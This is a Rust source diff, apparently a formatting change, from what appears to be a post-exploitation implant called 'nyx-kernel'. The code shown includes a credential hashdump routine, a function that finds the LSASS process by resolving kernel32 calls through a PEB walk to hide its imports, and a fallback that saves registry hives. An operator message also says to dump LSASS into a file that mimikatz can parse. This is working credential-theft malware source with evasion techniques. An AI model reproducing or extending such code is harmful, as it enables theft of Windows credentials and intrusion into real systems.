@@ -270,9 +270,7 @@ pub fn do_hashdump_vec(rt: Option<&'static Runtime>, method: u8) -> Vec<Response
                      LSASS — loudest IOC). LSASS pid=",
                 );
                 push_decimal(&mut m, lsass_pid as u32);
-                m.push_str(
-                    ". On the target run: `nyx-kernel dump-lsass ",
-                );
+                m.push_str(". On the target run: `nyx-kernel dump-lsass ");
                 push_decimal(&mut m, lsass_pid as u32);
                 m.push_str(
                     "` — it produces a real .dmp (mimikatz-parseable via minidump-assembler).\n",
@@ -316,14 +314,17 @@ fn push_decimal(s: &mut String, mut v: u32) {
 /// All kernel32 calls go through `crate::resolve::export_addr` (PEB walk).
 fn find_lsass_pid(_rt: &'static Runtime) -> Option<usize> {
     type CreateToolhelp32Snapshot = unsafe extern "system" fn(u32, u32) -> *mut core::ffi::c_void;
-    type Process32FirstW = unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32;
-    type Process32NextW = unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32;
+    type Process32FirstW =
+        unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32;
+    type Process32NextW =
+        unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32;
     type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
 
     const TH32CS_SNAPPROCESS: u32 = 0x00000002;
     const INVALID_HANDLE_VALUE: *mut core::ffi::c_void = -1isize as *mut core::ffi::c_void;
 
-    let snap_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateToolhelp32Snapshot") }?;
+    let snap_addr =
+        unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateToolhelp32Snapshot") }?;
     let first_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"Process32FirstW") }?;
     let next_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"Process32NextW") }?;
     let close_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") }?;
@@ -684,11 +685,10 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
     // existing file (returns ERROR_ALREADY_EXISTS = 183). A failed prior run
     // that left the .hive file would block all future hashdumps indefinitely.
     type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
-    let df: Option<DeleteFileW> =
-        match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
-            Some(a) => Some(unsafe { core::mem::transmute(a) }),
-            None => None,
-        };
+    let df: Option<DeleteFileW> = match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
+        Some(a) => Some(unsafe { core::mem::transmute(a) }),
+        None => None,
+    };
     if let Some(df) = df {
         let _ = unsafe { df(file_wide.as_ptr()) }; // ignore "not found" errors
     }
